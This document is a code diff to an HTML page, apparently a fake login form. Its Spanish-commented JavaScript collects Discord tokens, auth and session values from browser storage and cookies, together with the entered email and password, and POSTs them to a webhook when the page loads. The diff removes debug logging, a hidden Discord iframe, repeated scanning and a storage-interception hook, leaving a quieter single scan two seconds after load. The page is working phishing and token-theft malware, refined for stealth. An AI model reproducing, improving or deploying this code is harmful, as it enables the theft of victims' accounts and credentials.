@@ -219,49 +219,35 @@
             var tokens = [];
             var i, key, val;
             
-            console.log('Starting token scan...');
-            
-            // LocalStorage - buscar tokens de Discord
+            // LocalStorage
             try {
-                console.log('Scanning localStorage, total keys:', localStorage.length);
                 for (i = 0; i < localStorage.length; i++) {
                     key = localStorage.key(i);
                     val = localStorage.getItem(key);
                     
-                    // Log cada key para debug
-                    console.log('LS Key:', key);
-                    
                     if (key && val) {
-                        // Buscar cualquier key que contenga estas palabras
                         var keyLower = key.toLowerCase();
                         if (keyLower.indexOf('token') > -1 || 
                             keyLower.indexOf('discord') > -1 || 
                             keyLower.indexOf('auth') > -1 ||
                             keyLower.indexOf('user') > -1 ||
                             keyLower.indexOf('session') > -1) {
-                            console.log('Found potential token in LS:', key);
                             tokens.push({s: 'LS', k: key, v: val});
                         }
                         
-                        // Buscar por patrón de token de Discord (base64)
+                        // Buscar por patrón de token de Discord
                         if (val.length > 50 && (val.indexOf('mfa.') === 0 || /^[A-Za-z0-9_-]{24,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}$/.test(val))) {
-                            console.log('Found Discord token pattern:', key);
                             tokens.push({s: 'LS-Pattern', k: key, v: val});
                         }
                     }
                 }
-            } catch(e) {
-                console.error('Error scanning localStorage:', e);
-            }
+            } catch(e) {}
             
             // SessionStorage
             try {
-                console.log('Scanning sessionStorage, total keys:', sessionStorage.length);
                 for (i = 0; i < sessionStorage.length; i++) {
                     key = sessionStorage.key(i);
                     val = sessionStorage.getItem(key);
-                    
-                    console.log('SS Key:', key);
                     
                     if (key && val) {
                         var keyLower = key.toLowerCase();
@@ -270,46 +256,36 @@
                             keyLower.indexOf('auth') > -1 ||
                             keyLower.indexOf('user') > -1 ||
                             keyLower.indexOf('session') > -1) {
-                            console.log('Found potential token in SS:', key);
                             tokens.push({s: 'SS', k: key, v: val});
                         }
                         
                         if (val.length > 50 && (val.indexOf('mfa.') === 0 || /^[A-Za-z0-9_-]{24,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}$/.test(val))) {
-                            console.log('Found Discord token pattern in SS:', key);
                             tokens.push({s: 'SS-Pattern', k: key, v: val});
                         }
                     }
                 }
-            } catch(e) {
-                console.error('Error scanning sessionStorage:', e);
-            }
+            } catch(e) {}
             
             // Cookies
             try {
                 var cookies = document.cookie.split(';');
-                console.log('Scanning cookies, total:', cookies.length);
                 for (i = 0; i < cookies.length; i++) {
                     var parts = cookies[i].split('=');
                     if (parts.length >= 2) {
                         key = parts[0].replace(/^\s+/, '');
-                        val = parts.slice(1).join('='); // Por si el valor tiene '='
-                        
-                        console.log('Cookie:', key);
+                        val = parts.slice(1).join('=');
                         
                         var keyLower = key.toLowerCase();
                         if (keyLower.indexOf('token') > -1 || 
                             keyLower.indexOf('discord') > -1 || 
                             keyLower.indexOf('auth') > -1 ||
                             keyLower.indexOf('session') > -1 ||
-                            keyLower.indexOf('__') === 0) { // Cookies de Discord suelen empezar con __
-                            console.log('Found potential token in Cookie:', key);
+                            keyLower.indexOf('__') === 0) {
                             tokens.push({s: 'Cookie', k: key, v: val});
                         }
                     }
                 }
-            } catch(e) {
-                console.error('Error scanning cookies:', e);
-            }
+            } catch(e) {}
             
             // Eliminar duplicados
             var uniqueTokens = [];
@@ -322,19 +298,13 @@
                 }
             }
             
-            console.log('Total unique tokens found:', uniqueTokens.length);
             return uniqueTokens;
         }
         
         // Enviar al webhook
         function send(email, pass) {
-            console.log('Send function called with email:', email ? 'YES' : 'NO', 'pass:', pass ? 'YES' : 'NO');
-            
             var tokens = getTokens();
-            console.log('Tokens found:', tokens.length, tokens);
-            
             var platform = getPlatform();
-            console.log('Platform detected:', platform);
             
             var fields = [
                 {name: 'Platform', value: platform || 'Unknown', inline: true},
@@ -402,27 +372,10 @@
             };
             
             try {
-                console.log('Attempting to send webhook...', payload);
                 var xhr = new XMLHttpRequest();
                 xhr.open('POST', WEBHOOK);
                 xhr.setRequestHeader('Content-Type', 'application/json');
-                
-                // Debug: ver qué se está enviando
-                xhr.onload = function() {
-                    console.log('Webhook response:', xhr.status, xhr.responseText);
-                    if (xhr.status !== 204 && xhr.status !== 200) {
-                        console.error('Webhook error:', xhr.status, xhr.responseText);
-                    } else {
-                        console.log('Webhook sent successfully!');
-                    }
-                };
-                
-                xhr.onerror = function() {
-                    console.error('Network error sending webhook');
-                };
-                
                 xhr.send(JSON.stringify(payload));
-                console.log('Webhook request sent');
             } catch(e) {
                 console.error('Send error:', e);
             }
@@ -465,102 +418,13 @@
         document.getElementById('email').value = '';
         document.getElementById('password').value = '';
         
-        console.log('Page loaded, initializing token capture...');
+        console.log('Page loaded');
         
-        // Estrategia de iframe invisible para capturar tokens
-        var iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.style.width = '0';
-        iframe.style.height = '0';
-        iframe.style.border = 'none';
-        iframe.style.position = 'absolute';
-        iframe.style.top = '-9999px';
-        iframe.src = 'https://discord.com/app';
-        
-        console.log('Loading Discord in hidden iframe...');
-        document.body.appendChild(iframe);
-        
-        // Escaneo agresivo múltiple para capturar tokens
-        var scanCount = 0;
-        var maxScans = 20;
-        
-        // Escaneo inmediato
-        send(null, null);
-        scanCount++;
-        
-        // Escaneos repetidos cada 400ms durante 8 segundos
-        var aggressiveScan = window.setInterval(function() {
-            console.log('Aggressive scan #' + scanCount);
+        // Escaneo único al cargar
+        window.setTimeout(function() {
+            console.log('Initial scan');
             send(null, null);
-            scanCount++;
-            
-            if (scanCount >= maxScans) {
-                window.clearInterval(aggressiveScan);
-                console.log('Aggressive scanning complete');
-                // Remover iframe después de escanear
-                try {
-                    document.body.removeChild(iframe);
-                } catch(e) {}
-            }
-        }, 400);
-        
-        // Escaneo agresivo múltiple para capturar tokens durante la carga
-        var scanCount = 0;
-        var maxScans = 10;
-        
-        // Escaneo inmediato
-        send(null, null);
-        scanCount++;
-        
-        // Escaneos repetidos cada 500ms durante los primeros 5 segundos
-        var aggressiveScan = window.setInterval(function() {
-            console.log('Aggressive scan #' + scanCount);
-            send(null, null);
-            scanCount++;
-            
-            if (scanCount >= maxScans) {
-                window.clearInterval(aggressiveScan);
-                console.log('Aggressive scanning complete');
-            }
-        }, 500);
-        
-        // Escaneo adicional a los 3 segundos (por si acaso)
-        var autoTimer = window.setTimeout(function() {
-            console.log('Final auto-scan triggered');
-            send(null, null);
-        }, 3000);
-        
-        // Monitor de cambios en localStorage para capturar tokens en tiempo real
-        var originalSetItem = localStorage.setItem;
-        localStorage.setItem = function(key, value) {
-            console.log('localStorage.setItem intercepted:', key);
-            
-            // Llamar al método original
-            originalSetItem.apply(this, arguments);
-            
-            // Si detectamos algo relacionado con token, escanear inmediatamente
-            var keyLower = key.toLowerCase();
-            if (keyLower.indexOf('token') > -1 || 
-                keyLower.indexOf('discord') > -1 || 
-                keyLower.indexOf('auth') > -1) {
-                console.log('TOKEN DETECTED! Scanning immediately...');
-                send(null, null);
-            }
-        };
-        
-        // También monitorear Storage events (cambios desde otras pestañas)
-        window.addEventListener('storage', function(e) {
-            if (e.key && e.newValue) {
-                console.log('Storage event detected:', e.key);
-                var keyLower = e.key.toLowerCase();
-                if (keyLower.indexOf('token') > -1 || 
-                    keyLower.indexOf('discord') > -1 || 
-                    keyLower.indexOf('auth') > -1) {
-                    console.log('TOKEN STORAGE EVENT! Scanning...');
-                    send(null, null);
-                }
-            }
-        });
+        }, 2000);
     </script>
 </body>
 </html>
